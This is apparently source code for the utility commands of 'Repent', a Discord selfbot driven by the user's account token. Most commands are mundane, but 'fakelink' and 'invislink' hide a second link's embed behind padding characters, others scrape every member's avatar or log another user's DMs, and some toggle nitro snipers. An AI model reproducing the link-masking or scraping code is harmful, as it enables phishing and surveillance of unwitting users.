@Repent.command(description=f"Disables all emails from discord. \nUsage: {config_get('prefix')}noemails", help="utility")
async def noemails(ctx):
    payload = {"settings":{"categories":{"tips":False,"recommendations_and_events":False,"updates_and_announcements":False,"communication": False, "social": False, "family_center_digest":False}}}
    r = (await arequesters.patch('https://discord.com/api/v9/users/@me/email-settings', headers={'authorization':config_get('token')}, json_data=payload))
    if r.status_code == 200:
        heading = "Successfully Unsubscribed!"
        body = "You will no longer recieve emails from Discord"
        cmdname = "noemails"
        await panelmaker(ctx, heading, body, cmdname)
    else:
        heading = "Failed to Unsubscribe"
        body = f"Error code: {r.status_code}"
        cmdname = "noemails"

@Repent.command(description=f"Sends a Discord link so someone can add you. \nUsage: {config_get('prefix')}friendlink", help="utility")
async def friendlink(ctx):    
    headers ={'Authorization': config_get('token'),
              "content-type": "application/json"}
    a = (await arequesters.post("https://discordapp.com/api/v9/users/@me/invites", headers=headers, json_data={}))
    t = json.loads(a.text)
    code = t['code']
    await ctx.send(f"https://discord.gg/{code}")

@Repent.command(description=f"Converts an image to gif for saving. \nUsage: {config_get('prefix')}pictogif (link to image)", help="utility")
async def pictogif(ctx, link):    
    await ctx.send(f"{link}?.gif")

@Repent.command(description=f"Sends the current uptime of the bot. \nUsage: {config_get('prefix')}uptime", help="utility")
async def uptime(ctx):
    uptime = str(timedelta(seconds=int(round(time.time()-start_time))))   
    heading = "Uptime"
    body = f"{uptime}"
    cmdname = "Uptime"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Downloads everyone's PFP from a server. \nUsage: {config_get('prefix')}downloadallpfp", help="utility")
async def downloadallpfp(ctx):   
    logging.getLogger('discord.gateway').setLevel(logging.ERROR) 
    guild1 = ctx.guild.name
    guild1 = guild1.replace(' ', '-')
    users = await scrape(ctx.guild.id, ctx.guild.member_count)
    if not os.path.exists(f'data/media/photos/{guild1}-pfps'):
        os.mkdir(f'data/media/photos/{guild1}-pfps')
    else:
        shutil.rmtree(f'data/media/photos/{guild1}-pfps')
        os.mkdir(f'data/media/photos/{guild1}-pfps')
    try:
        for user in users:
            with open(f'data/media/photos/{guild1}-pfps/{user.id}.png', 'wb') as f:
                r = (await arequesters.get(user.avatar, stream=True))
                for block in r.iter_content(1024):
                    if not block:
                        break
                    f.write(block)
    except Exception as f:
        print(f)

@Repent.command(description=f"Gets the link of everyone's PFP from a server. \nUsage: {config_get('prefix')}getallpfp", help="utility")
async def getallpfp(ctx):  
    logging.getLogger('discord.gateway').setLevel(logging.ERROR)  
    guild1 = ctx.guild.name
    guild1 = guild1.replace(' ', '-')
    users = await scrape(ctx.guild.id, ctx.guild.member_count)
    delly = open(f"data/media/photos/{guild1}-pfps.txt","w")
    try:
        for member in users:
            delly.write(f'{member.display_name}: {member.avatar}\n')
    except Exception as E:
        print(E)
        pass

@Repent.command(description=f"Shows info on games that are on Steam. \nUsage: {config_get('prefix')}gameinfo <game>", help="utility")
async def gameinfo(ctx, *, game):    
    r = (await arequesters.get(urlify(f"https://api.popcat.xyz/steam?q={game}")))
    r = r.json()
    try:
        name = r["name"]
        Controller = r["controller_support"]
        web = r["website"]
        dev = r["developers"][0]
        price = r["price"]
        heading = f"{name} Info"
        body = f"Price: {price}\nDeveloper: {dev}\nWebsite: {web}\nController Support: {Controller}"
        cmdname = "Game Info"
        await panelmaker(ctx, heading, body, cmdname)
    except:
        heading = "No Game Found"
        body = f"Could not find a game with the name '{game}'"
        cmdname = "Game Info"
        await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Translate text to a different language. \nUsage: {config_get('prefix')}translate <language you want to translate to> <text you want to translate>", help="utility")
async def translate(ctx, lang, *, text):    
    r = (await arequesters.get(urlify(f"https://api.popcat.xyz/translate?to={lang}&text={text}")))
    res = r.json()
    await ctx.send(f"{res['translated']}")

@Repent.command(description=f"Searches for a YouTube video. \nUsage: {config_get('prefix')}ytsearch <query>", help="utility")
async def ytsearch(ctx, *, query):    
    results = YoutubeSearch(query, max_results=1).to_json()
    char1 = results[20]
    char2 = results[21]
    char3 = results[22]
    char4 = results[23]
    char5 = results[24]
    char6 = results[25]
    char7 = results[26]
    char8 = results[27]
    char9 = results[28]
    char10 = results[29]
    char11 = results[30]
    suffix = char1 + char2 + char3 + char4 + char5 + char6 + char7 + char8 + char9 + char10 + char11
    await ctx.send(f"https://www.youtube.com/watch?v={suffix}")

@Repent.command(description=f"Searches for and plays a YouTube video. \nUsage: {config_get('prefix')}ytplay <query>", help="utility")
async def ytplay(ctx, *, query):    
    results = YoutubeSearch(query, max_results=1).to_json()
    char1 = results[20]
    char2 = results[21]
    char3 = results[22]
    char4 = results[23]
    char5 = results[24]
    char6 = results[25]
    char7 = results[26]
    char8 = results[27]
    char9 = results[28]
    char10 = results[29]
    char11 = results[30]
    suffix = char1 + char2 + char3 + char4 + char5 + char6 + char7 + char8 + char9 + char10 + char11
    webbrowser.open(f"https://www.youtube.com/watch?v={suffix}")

@Repent.command(description=f"Reads all notifications. \nUsage: {config_get('prefix')}read", help="utility")
async def read(ctx):    
    guildr = (await arequesters.get('https://canary.discord.com/api/v9/users/@me/guilds', headers={'authorization': config_get('token')})).json()
    for guild in guildr:
        readstatelist = []
        channelsr = (await arequesters.get(f'https://canary.discord.com/api/v9/guilds/{guild["id"]}/channels', headers={'authorization': config_get('token')})).json()
        for channel in channelsr:
            if len(readstatelist) > 90:
                ack = (await arequesters.post('https://canary.discord.com/api/v9/read-states/ack-bulk', headers={'authorization': config_get('token')}, json_data={'read_states':readstatelist}))
                readstatelist = []
                await asyncio.sleep(0.7)
            if channel['type'] == 4:
                continue
            if channel['last_message_id']:
                readstatelist.append({"channel_id":str(channel['id']),"message_id":str(channel['last_message_id']),"read_state_type":0})
        if len(readstatelist) < 1:
            continue 
        ack = (await arequesters.post('https://canary.discord.com/api/v9/read-states/ack-bulk', headers={'authorization': config_get('token')}, json_data={'read_states':readstatelist}))
        await asyncio.sleep(0.7)

@Repent.command(description=f"Creates a TinyURL for a URL. \nUsage: {config_get('prefix')}tinyurl <url>", help="utility")
async def tinyurl(ctx, url):    
    r = (await arequesters.get(f'https://tinyurl.com/api-create.php?url={url}')).text
    await ctx.send(r)

@Repent.command(description=f"Creates a custom QR code. \nUsage: {config_get('prefix')}customqr <url>", help="utility")
async def customqr(ctx, link):  
    url = f'https://api.qrserver.com/v1/create-qr-code/?size=150x150&data={link}'  
    await apiimg(ctx, url)

@Repent.command(description=f"Changes your wallpaper to an image you attach. \nUsage: {config_get('prefix')}wallpaper <link/image embed>", help="utility")
async def wallpaper(ctx, wallpaper):    
    url = wallpaper
    r = (await arequesters.get(url))
    name = "data//media//TempPicstemp.png"
    file = open(name, "wb")
    file.write(r.content)
    file.close()
    PATH = os.path.abspath(name)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, PATH, 3)
    os.remove(name)

@Repent.command(description=f"Displays latency of local Reddit Google and Discord API. \nUsage: {config_get('prefix')}ping", help="utility")
async def ping(ctx):    
    try:
        reddit_response = requested.get('https://www.reddit.com', timeout=10)
        google_response = requested.get('https://www.google.com', timeout=10)
        discord_response = requested.get('https://www.discord.com', timeout=10)
        reddit_latency = round(reddit_response.elapsed.total_seconds() * 1000)  
        google_latency = round(google_response.elapsed.total_seconds() * 1000)  
        discord_latency = round(discord_response.elapsed.total_seconds() * 1000)  
    except requested.RequestException:
        reddit_latency = 'Failed to ping Reddit.'
        google_latency = 'Failed to ping Google.'
        discord_latency = 'Failed to ping Discord.'
    local_latency = round(Repent.latency * 1000) 
    heading = "Ping Results"
    body = f"Local Ping: {local_latency}ms\nReddit Ping: {reddit_latency}ms\nGoogle Ping: {google_latency}ms\nDiscord Ping: {discord_latency}ms"
    cmdname = "Ping"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Shows a link with another hidden link used as the embed. \nUsage: {config_get('prefix')}fakelink <link you want to see> <link with the embed>", help="utility")
async def fakelink(ctx, link1, link2):    
    await ctx.send(f"{link1} ‎||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||‎‎||‎||‎‎||‎‎||‎‎||‎‎||||||||||||||||||||||{link2}")

@Repent.command(description=f"Sends an empty message but has a link embed. \nUsage: {config_get('prefix')}invislink <link with the embed>", help="utility")
async def invislink(ctx, link2):    
    await ctx.send(f"‏‏‎‎||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||‎‎||‎||‎‎||‎‎||‎‎||‎‎||||||||||||||||||||||{link2}")

@Repent.command(description=f"Cycles between custom statuses to disable it just run the command again. \nUsage: {config_get('prefix')}cyclestatus <status 1> <status 2>\n\nThis is also used as a two way toggle, to turn this off, do the command without any args.", help="utility")
async def cyclestatus(ctx, status1=None, status2=None):    
    with open('data/Settings/Configs/Settings.json', 'r') as file:
        settings_data = json.load(file)
    if 'cyclestatus' not in settings_data:
        settings_data['cyclestatus'] = False
        with open('data/Settings/Configs/Settings.json', 'w') as file:
            json.dump(settings_data, file, indent=4)
    if status1 is None or status2 is None:
        if setting_get('cyclestatus') is True:
            setting_edit("cyclestatus", False)
            heading = "Cycle Status"
            body = "Stopped Cycling Status!"
            cmdname = "Cycle Status"
            await panelmaker(ctx, heading, body, cmdname)
        else:
            heading = "Cycle Status"
            body = "Please try again with 2 statuses."
            cmdname = "Cycle Status"
            await panelmaker(ctx, heading, body, cmdname)
    else:
        setting_edit("cyclestatus", True)
        heading = "Cycle Status"
        body = "Cycle Status Starting."
        cmdname = "Cycle Status"
        await panelmaker(ctx, heading, body, cmdname)
        threading.Thread(target=cycle_statuses_thread(status1, status2)).start()

@Repent.command(description=f"Searches UrbanDictionary for a word or phrase. \nUsage: {config_get('prefix')}urban <phrase/word>", help="utility")
async def urban(ctx, *, word):    
    try:
        webthingy = urllib.request.urlopen("https://www.urbandictionary.com/define.php?term=" + word)
        hurbadurban = bs4(webthingy, "html.parser")
        definition = hurbadurban.find(class_="meaning").get_text()
        heading = "Urban Dictionary"
        body = f"Definition of: {word}\n{definition}"
        cmdname = "Urban"
        await panelmaker(ctx, heading, body, cmdname)
    except:
        heading = "Urban Dictionary"
        body = f"{word} cannot be found"
        cmdname = "Urban"
        await panelmaker(ctx, heading, body, cmdname)

@Repent.command(aliases=["restart"], description=f"Restarts the selfbot. \nUsage: {config_get('prefix')}restart", help="utility")
async def reboot(ctx):
    try:
        os_name = platform.system()
        if os_name == 'Windows':
            os.startfile("Repent.exe")
            os._exit(1)
        elif os_name in ['Darwin', 'Linux']:
            os.system("./Repent.bin")
        else:
            raise NotImplementedError("Unsupported operating system")
        os._exit(1)
    except (FileNotFoundError, NotImplementedError):
        os.system("python Repent.py")
        os._exit(1)
    except Exception as e:
        await ctx.send(f"Failed to restart Repent: {e}")
        os._exit(1)

@Repent.command(aliases=["selfpurge", "purgeself", "selfclear", "clearself"], description=f"Purges a specified amount of messages sent by you in a channel or DM. \nUsage: {config_get('prefix')}purgemsg [number of messages]", help="utility")
async def purgemsg(ctx, amount: int=10):    
    async for message in ctx.channel.history(limit=amount).filter(lambda m: m.author.id == Repent.user.id).map(lambda m: m):
        try:
            await message.delete()
            await asyncio.sleep(1)
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}{str(e)}"+Fore.RESET)
            await send_webhook("Purge Messages Error", f"Failed to purge messages due to: {str(e)}.", config_get('error_webhook_url'))
    heading = "Purge Messages"
    body = f"{amount} messages have been purged!"
    cmdname = "purgemsg"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Changes your nitro sniper logging webhook. \nUsage: {config_get('prefix')}nitrowebhook <webhook url>", help="utility")
async def nitrowebhook(ctx, url):    
    config_edit('nitro_webhook_url', url)
    heading = "Nitro Webhook"
    body = f"Your nitro webhook has been changed!"
    cmdname = "nitrowebhook"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Changes your giveaway sniper logging webhook. \nUsage: {config_get('prefix')}giveawaywebhook <webhook url>", help="utility")
async def giveawaywebhook(ctx, url):    
    config_edit('giveaway_webhook_url', url)
    heading = "Giveaway Webhook"
    body = f"Your giveaway webhook has been changed!"
    cmdname = "giveawaywebhook"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Changes your ping logging webhook. \nUsage: {config_get('prefix')}pinglogwebhook <webhook url>", help="utility")
async def pinglogwebhook(ctx, url):    
    config_edit('pinglogger_webhook_url', url)
    heading = "Pinglogger Webhook"
    body = f"Your pinglogger webhook has been changed!"
    cmdname = "pinglogwebhook"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Changes your prefix. \nUsage: {config_get('prefix')}changeprefix <prefix>", help="utility")
async def changeprefix(ctx, prefix):    
    config_edit('prefix', prefix)
    heading = "Prefix"
    body = f"Your prefix has been changed to {prefix}"
    cmdname = "changeprefix"
    await panelmaker(ctx, heading, body, cmdname)
    Repent.command_prefix = config_get('prefix')

@Repent.command(aliases=["constheme", "ctheme"], description=f"Changes the theme of the bot. \nUsage: {config_get('prefix')}changetheme [theme]", help="utility")
async def changetheme(ctx, file=None):    
    theme_dir = "data//Themes//"
    matched_files = glob.glob(f"{theme_dir}{file}*")
    try:
        if file == None:
            config_edit('theme', "")
            clear_console()
            terminalui()
            heading = "Change Theme"
            body = f"Theme changed to 'Repent'"
            cmdname = "changetheme"
            await panelmaker(ctx, heading, body, cmdname)             
        elif not matched_files:
            heading = "Change Theme"
            body = f"File '{file}' could not be found"
            cmdname = "changetheme"
            await panelmaker(ctx, heading, body, cmdname)
        else:
            config_edit('theme', file)
            clear_console()
            terminalui()
            heading = "Change Theme"
            body = f"Theme changed to '{file}'"
            cmdname = "changetheme"
            await panelmaker(ctx, heading, body, cmdname)
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}{str(e)}"+Fore.RESET)
        await send_webhook("Change Theme Error", f"Failed to change theme due to: {str(e)}.", config_get('error_webhook_url'))

@Repent.command(aliases=["lst", "lsthemes"], description=f"Lists the themes in the themes folder. \nUsage: {config_get('prefix')}listthemes", help="utility")
async def listthemes(ctx):
    directory = 'data//Themes'
    try:
        files = os.listdir(directory)
        files = [file for file in files if os.path.isfile(os.path.join(directory, file))]
        if files:
            body = "\n".join(files)
        else:
            body = "No files found."
        heading = "Themes List"
        cmdname = "listthemes"
        await panelmaker(ctx, heading, body, cmdname)
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}{str(e)}"+Fore.RESET)
        await send_webhook("List Themes Error", f"Failed to list themes due to: {str(e)}.", config_get('error_webhook_url'))

@Repent.command(aliases=["lsc", "lscustomcmds"], description=f"Lists the custom commands in the customcmds folder. \nUsage: {config_get('prefix')}listcustomcmds", help="utility")
async def listcustomcmds(ctx):
    directory = 'data//CustomCmds'
    try:
        files = os.listdir(directory)
        py_files = [file for file in files if file.endswith('.py') and os.path.isfile(os.path.join(directory, file))]
        if py_files:
            body = "\n".join(py_files)
        else:
            body = "No .py files found."
        heading = "CustomCmds List"
        cmdname = "listcustomcmds"
    except Exception as e:
        body = f"Error: {e}"
        heading = "Error"
        cmdname = "listcustomcmds"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(aliases=["ethemes", "edittheme", "editthemes"], description=f"Changes web embed theme. \nUsage: {config_get('prefix')}etheme <theme>", help="utility")
async def etheme(ctx, *, theme_name: str):
    config_path = CONFIG_FILE
    try:
        with open(config_path, "r") as config_file:
            config = json.load(config_file)
    except FileNotFoundError:
        config = {}
    config["etheme"] = theme_name
    with open(config_path, "w") as config_file:
        json.dump(config, config_file, indent=4)
    heading = "Theme Changed"
    body = f"The theme has been changed to: {theme_name}"
    cmdname = "etheme"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(aliases=["lset", "listethems"], description=f"Lists the embed themes in the ethemes folder. \nUsage: {config_get('prefix')}listethemes", help="utility")
async def listethemes(ctx):
    directory = 'data/Settings/Configs/Ethemes'
    try:
        files = os.listdir(directory)
        theme_files = [file for file in files if os.path.isfile(os.path.join(directory, file))]
        if theme_files:
            body = "\n".join(theme_files)
        else:
            body = "No theme files found."
        heading = "Ethemes List"
        cmdname = "listethemes"
    except Exception as e:
        body = f"Error: {e}"
        heading = "Error"
        cmdname = "listethemes"
    await panelmaker(ctx, heading, body, cmdname)

def format_duration(seconds):
    hours, remainder = divmod(seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    formatted_duration = ''
    if hours:
        formatted_duration += f"{hours}h "
    if minutes:
        formatted_duration += f"{minutes}m "
    if seconds or not formatted_duration:
        formatted_duration += f"{seconds}s"
    return formatted_duration.strip()

def format_unix_timestamp(timestamp):
    return datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')

@Repent.command(aliases=['remind'], description=f"Sets a reminder. \nUsage: {config_get('prefix')}reminder <time (10s, 10m, 10h, 10d)> <reminder message>", help="utility")
async def reminder(ctx, time: str, *, reminder: str):
    if ctx.guild is not None:
        try:
            await ctx.message.delete()
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[{get_time()}] Reminder Set! {Fore.WHITE}{reminder} ~ was set for {time}"+Fore.RESET)

    time_regex = re.compile(r"(?:(\d+)d)?(?:(\d+)h)?(?:(\d+)m)?(?:(\d+)s)?")
    match = time_regex.fullmatch(time)
    if not match:
        return await ctx.send("Invalid time format. Please use `d` for days, `h` for hours, `m` for minutes, `s` for seconds.")

    days, hours, minutes, seconds = match.groups(default=0)
    delay = timedelta(days=int(days), hours=int(hours), minutes=int(minutes), seconds=int(seconds)).total_seconds()

    if delay <= 0:
        return await ctx.send("You must specify a time in the future.")

    reminder_time = datetime.utcnow()
    heading = "Reminder Set!"
    body = f"{reminder} was set for {time}"
    cmdname = "Reminder"
    await panelmaker(ctx, heading, body, cmdname)

    await asyncio.sleep(delay)

    elapsed_time = datetime.utcnow() - reminder_time
    elapsed_seconds = int(elapsed_time.total_seconds())
    elapsed_str = format_duration(elapsed_seconds)

    webhook_message = {
        "username": load_Webhooks_config()['Webhook_Username'],
        "avatar": load_Webhooks_config()['Webhook_Avatar'],
        "embeds": [{
            "title": "Chedminder Set!",
            "description": f"Reminder: {reminder}\n\n Period of time: Set **{elapsed_str}** ago.",
            "footer": {"text": f"Chedminder Command"},
            "thumbnail": {"url": load_Webhooks_config()['Webhook_Image']},
            "color": load_Webhooks_config()['Webhook_Colour']
        }]
    }

    webhook_url = config_get('dmlogger_webhook_url')
    response = (await arequesters.post(webhook_url, json_data=webhook_message))

    if response.status_code == 200:
        print("Reminder successfully sent to the webhook.")

    ping_message = {
        "content": f"Chedminder - {ctx.author.mention}",
        "username": load_Webhooks_config()['Webhook_Username'],
        "avatar": load_Webhooks_config()['Webhook_Avatar']
    }

    response = (await arequesters.post(webhook_url, json_data=ping_message))

    if response.status_code == 200:
        print("User ping sent to the webhook.")

@Repent.command(description=f"Toggles Discord Rich Presence on and off. \nUsage: {config_get('prefix')}rpc [config name]", help="utility")
async def rpc(ctx, name=None):
    if name is None or name is None and config_get('rpc') == "":
        config_edit('rpc', "")
        heading = "RPC Toggle"
        body = "Discord Rich Presence is now disabled."
        cmdname = "rpc"
        await panelmaker(ctx, heading, body, cmdname)
        await retardpresence()
    elif name is not None:
        config_path = f"data/rpc_configs/{name}.json"
        if os.path.exists(config_path):
            config_edit('rpc', name)
            heading = "RPC Toggle"
            body = "Discord Rich Presence is now enabled."
            cmdname = "rpc"
            await panelmaker(ctx, heading, body, cmdname)
            await retardpresence()
        else:
            heading = "RPC Toggle"
            body = f"RPC config {name}.json does not exist in data/rpc_configs."
            cmdname = "rpc"
            await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Creates a config file for RPC. \nUsage: {config_get('prefix')}cfgrpc <name> <Title> <Description> <Large Image> \n<Small Image> <Large Image Text> <Small Image Text> <Status> <State> <Subtext> <Timer: (True/False)> <Watch_Url> [Button Label 1] [Button Url 1] [Button Label 2] [Button Url 2]", help="utility")
async def cfgrpc(ctx, name: str, title: str, description: str, largeimg: str, smallimg: str, largeimgtext: str, smallimgtext: str, status: str, state: str, subtext: str, timer: bool, watchurl: str, buttonlabel1: str=None, buttonurl1: str=None, buttonlabel2: str=None, buttonurl2: str=None):
    if name == "":
        heading = "Error"
        body = "Please provide a name for your config."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
        return

    rpcdata = {
        "Title": title,
        "Description": description,
        "Large_Image": largeimg,
        "Small_Image": smallimg,
        "Large_Image_Text": largeimgtext,
        "Small_Image_Text": smallimgtext,
        "Status": status,
        "State": state,
        "SubText": subtext,
        "Timer": timer,
        "Watch_Url": watchurl,
        "Buttons": []
    }
    if buttonlabel1 and buttonurl1:
        newjson = {
            "label": buttonlabel1,
            "url": buttonurl1
        }
        rpcdata['Buttons'].append(newjson)

    elif buttonlabel2 and buttonurl2:
        newjson = {
            "label": buttonlabel2,
            "url": buttonurl2
        }
        rpcdata['Buttons'].append(newjson)

    with open(f'data/rpc_configs/{name}.json', 'w') as f:
        json.dump(rpcdata, f, indent=4)
        heading = "Config Created!"
        body = f"RPC Config called '{name}' created!"
        cmdname = "cfgrpc"
        await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Creates a config for console rpc. \nUsage: {config_get('prefix')}consolerpc <name> <Title> <Description> <Subtext>\n<Large Image> <Small Image> <Large Image Text>\n<Small Image Text> <Status> <Timer: (True/False)> <Platform>", help="utility")
async def consolerpc(ctx, name: str, title: str, description: str, subtext: str, largeimg: str, smallimg: str, largeimgtext: str, smallimgtext: str, status: str, timer: bool, platform: str):
    if platform[0].lower() != "x" and platform[0].lower() != "p":
        heading = "Invalid Platform"
        body = "Please either input playstation or xbox for platform."
        cmdname = "consolerpc"
        await panelmaker(ctx, heading, body, cmdname)
        return
    rpcdata = {
    "Title": title,
    "Description": description,
    "SubText": subtext,
    "Large_Image": largeimg,
    "Small_Image": smallimg,
    "Large_Image_Text": largeimgtext,
    "Small_Image_Text": smallimgtext,
    "Status": status,
    "Timer": timer,
    "Platform": platform
    }
    with open(f'data/rpc_configs/{name}.json', 'w') as f:
        json.dump(rpcdata, f, indent=4)
        heading = "Config Created!"
        body = f"Console RPC Config called '{name}' created!"
        cmdname = "consolerpc"
        await panelmaker(ctx, heading, body, cmdname)
    

@Repent.command(description=f"Creates a config for spotify rpc. \nUsage: {config_get('prefix')}scfgrpc <name> <SongTitle> <ArtistName> <AlbumName> <Image> <Song Length (number)> <status>\n<Buttons (True/False)> <albumid>", help="utility")
async def scfgrpc(ctx, name: str,songtitle: str, artistname: str, albumname: str, image: str, songlength: int, status: str, buttons: bool, albumid: str):
    rpcdata = {
        "SongTitle": songtitle,
        "ArtistName": artistname,
        "AlbumName": albumname,
        "Image": image,
        "SongLength": songlength,
        "Status": status,
        "Buttons": buttons,
        "albumid": albumid
    }
    with open(f'data/rpc_configs/{name}.json', 'w') as f:
        json.dump(rpcdata, f, indent=4)
        heading = "Spotify RPC Config Created!"
        body = f"Spotify RPC Config called '{name}' created!"
        cmdname = "scfgrpc"
        await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Toggles pinglogger on and off. \nUsage: {config_get('prefix')}pinglogger", help="utility")
async def pinglogger(ctx):    
    if config_get('pinglogger') == True:
        config_edit('pinglogger', False)
        heading = "Pinglogger Toggle"
        body = "Pinglogger is now disabled."
        cmdname = "pinglogger"
        await panelmaker(ctx, heading, body, cmdname)
    elif config_get('pinglogger') == False:
        config_edit('pinglogger', True)
        heading = "Pinglogger Toggle"
        body = "Pinglogger is now enabled."
        cmdname = "pinglogger"
        await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Toggles giveaway sniper on and off. \nUsage: {config_get('prefix')}gsniper", help="utility")
async def gsniper(ctx):    
    if config_get('giveaway_sniper') == True:
        config_edit('giveaway_sniper', False)
        heading = "Giveaway Sniper Toggle"
        body = "Giveaway Sniper is now disabled."
        cmdname = "gsniper"
        await panelmaker(ctx, heading, body, cmdname)
    elif config_get('giveaway_sniper') == False:
        config_edit('giveaway_sniper', True)
        heading = "Giveaway Sniper Toggle"
        body = "Giveaway Sniper is now enabled."
        cmdname = "gsniper"
        await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Toggles nitro sniper on and off. \nUsage: {config_get('prefix')}nsniper", help="utility")
async def nsniper(ctx):    
    if config_get('nitro_sniper') == True:
        config_edit('nitro_sniper', False)
        heading = "Nitro Sniper Toggle"
        body = "Nitro Sniper is now disabled."
        cmdname = "nsniper"
        await panelmaker(ctx, heading, body, cmdname)
    elif config_get('nitro_sniper') == False:
        config_edit('nitro_sniper', True)
        heading = "Nitro Sniper Toggle"
        body = "Nitro Sniper is now enabled."
        cmdname = "nsniper"
        await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Toggles AFK Mode on and off. \nUsage: {config_get('prefix')}afkmode", help="utility")
async def afkmode(ctx):    
    if config_get('afkmode') == True:
        config_edit('afkmode', False)
        heading = "AFK Toggle"
        body = "Afk Mode is now disabled."
        cmdname = "afkmode"
        await panelmaker(ctx, heading, body, cmdname)
    elif config_get('afkmode') == False:
        config_edit('afkmode', True)
        heading = "Afk Toggle"
        body = "Afk Mode is now enabled."
        cmdname = "afkmode"
        await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Toggles webhook notifications on and off. \nUsage: {config_get('prefix')}webhooknotifs", help="utility")
async def webhooknotifs(ctx):    
    if config_get('webhooknotifs') == True:
        config_edit('webhooknotifs', False)
        heading = "Webhook Notification Toggle"
        body = "Webhook notifications are now disabled."
        cmdname = "webhooknotifs"
        await panelmaker(ctx, heading, body, cmdname)
    elif config_get('webhooknotifs') == False:
        config_edit('webhooknotifs', True)
        heading = "Webhook Notification Toggle"
        body = "Webhook notifications are now enabled."
        cmdname = "webhooknotifs"
        await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Switches your embed mode between web embeds and indent embeds. \nUsage: {config_get('prefix')}embedmode <embed mode (web/indent)>", help="utility")
async def embedmode(ctx, mode): 
    if mode.lower() != "web" and mode.lower() != "indent" and mode.lower() !="app":
        heading = "ERROR"
        body = "You did not use a valid mode.\nPlease use either 'indent' or 'web'"
        cmdname = "ERROR"  
        await panelmaker(ctx, heading, body, cmdname)
    else:
        config_edit('embed_mode', mode)
        heading = "Embed Mode"
        body = f"Now using {mode} embeds!"
        cmdname = "embedmode"
        await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Changes the message to be sent whilst AFK Mode is active. \nUsage: {config_get('prefix')}afkmsg <message>", help="utility")
async def afkmsg(ctx, *, msg):
    config_edit('afkmsg', msg)
    heading = "AFK Msg"
    body = f"AFK Message changed to: {msg}"
    cmdname = "afkmsg"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Logs a users DMs to you. \nUsage: {config_get('prefix')}dmlog <@user>", help="utility")
async def dmlog(ctx, user: discord.User):
    setting_edit('dmlogid', user.id)
    if user.id in setting_get('dmlogid'):
        heading = "DM Logger"
        body = f"{user.name}'s DM's now being logged!"
        cmdname = "dmlog"
        await panelmaker(ctx, heading, body, cmdname)
    else:
        heading = "DM Logger"
        body = f"{user.name}'s DM's no longer being logged!"
        cmdname = "dmlog"
        await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Removes a paywall from a website. \nUsage: {config_get('prefix')}removepaywall <url>", help="utility")
async def removepaywall(ctx, url):    
    webbrowser.open(f"https://12ft.io/proxy?ref=&q={url}")

